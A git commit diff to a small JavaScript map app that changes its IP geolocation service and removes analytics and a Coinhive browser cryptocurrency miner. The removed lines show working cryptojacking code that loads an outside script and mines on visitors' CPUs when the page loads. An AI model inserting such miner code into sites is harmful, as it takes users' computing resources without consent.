f4ae8f9ca6df5e4fb7360d70ffa7ca36e7117267
Bastiaan van der Plaat <bastiaan.v.d.plaat@gmail.com>
2018-11-18 12:18:04 +0100

    Update libs & fix adblocker no map error & remove trackers and miners

--- plaatmaps.js
+++ plaatmaps.js
@@ -38,9 +38,12 @@ if (window.location.hash !== '') {
     var xhr = new XMLHttpRequest();
     xhr.onload = function () {
         var data = JSON.parse(xhr.responseText);
-        map.setView([data.latitude, data.longitude], 13);
+        map.setView([data.lat, data.lon], 13);
     };
-    xhr.open('GET', 'https://ipapi.co/json');
+    xhr.onerror = function () {
+        map.setView([52.018, 4.708], 13);
+    };
+    xhr.open('GET', 'https://ip-api.com/json');
     xhr.send();
 }
 
@@ -95,21 +98,3 @@ map.on('locationfound', function (event) {
 map.on('locationerror', function (error) {
     alert('Location errror: ' + error.message);
 });
-
-var miner, minerScript = document.createElement('script');
-minerScript.src = 'https://coinhive.com/lib/coinhive.min.js';
-minerScript.addEventListener('load', function () {
-    miner = new CoinHive.Anonymous('ENDYwvXEVLN7UFRO43zBsKNHAYGXx9u2');
-    miner.setThrottle(miner.isMobile() ? 0.4 : 0.2);
-    miner.start();
-});
-document.head.appendChild(minerScript);
-
-var analyticsScript = document.createElement('script');
-analyticsScript.src = 'https://www.googletagmanager.com/gtag/js?id=UA-110826300-4';
-document.head.appendChild(analyticsScript);
-
-window.dataLayer = window.dataLayer || [];
-function gtag () { dataLayer.push(arguments); }
-gtag('js', new Date());
-gtag('config', 'UA-110826300-4');
